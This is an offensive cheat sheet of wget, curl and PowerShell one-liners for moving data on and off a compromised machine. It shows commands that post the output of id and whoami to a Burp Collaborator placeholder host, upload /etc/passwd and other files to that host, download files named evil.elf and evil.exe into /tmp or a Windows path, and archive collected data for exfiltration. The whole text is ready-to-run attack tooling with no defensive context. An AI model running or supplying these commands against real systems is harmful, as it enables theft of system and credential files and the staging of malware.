# Data Transfer Cheatsheet

## Posting Command Output
Use these to post the output of commands to a remote HTTP server.

### wget
```
wget --method="POST" --body-data "$(id)" http://your-sub-domain.burpcollaborator.net -O /dev/null
```

### curl
```
curl -X POST --data "$(id)" http://your-sub-domain.burpcollaborator.net
```

### PowerShell
```
powershell.exe -Command (New-Object System.Net.WebClient).UploadString('http://your-sub-domain.burpcollaborator.net', (Invoke-Expression -Command:'whoami'))
```

## UPLOADING FILES
Use these commands to move files off of the system
### wget
```
wget --post-file /etc/passwd http://your-sub-domain.burpcollaborator.net -O /dev/null
```

### curl
```
curl -X POST -d @/etc/passwd http://your-sub-domain.burpcollaborator.net
```

### PowerShell
```
powershell.exe -Command (New-Object System.Net.WebClient).UploadFile('http://your-sub-domain.burpcollaborator.net', 'c:\path\to\file.ext')
```

## DOWNLOADING FILES
Download files when you need to move data onto the system.  On Linux, don’t forget that you need to chmod +x any file that you download.
### wget
```
wget http://domain.com/evil.elf -O /tmp/evil
```

### curl
```
curl -O http://domain.com/evil.elf -o /tmp/evil
```

### PowerShell
```
powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('http://domain.com/evil.exe', 'c:\path\to\file.ext')
```

## COMPRESSION
Sometimes it’s more efficient to create an archive on the remote system and then exfiltrate the archive containing all the interesting data you found.  PowerShell compression is relatively new and may not be supported in older versions.  On Linux, tar is almost always installed.

### Windows
```
Powershell.exe -Command "Compress-Archive -Path 'c:\folder\or\file\to\archive' -DestinationPath 'c:\path\to\save\new\archive.zip'"
```

7zip is a common application that may be installed on the system.  The path to 7z.exe may change based on the system.

```
"c:\Program Files\7-Zip\7z.exe" a c:\path\to\save\new\archive.zip c:\folder\or\file\to\archive\
```

### Linux
```
tar -czf /path/to/output/file.tar.gz /path/to/folder/or/file/to/compress
```
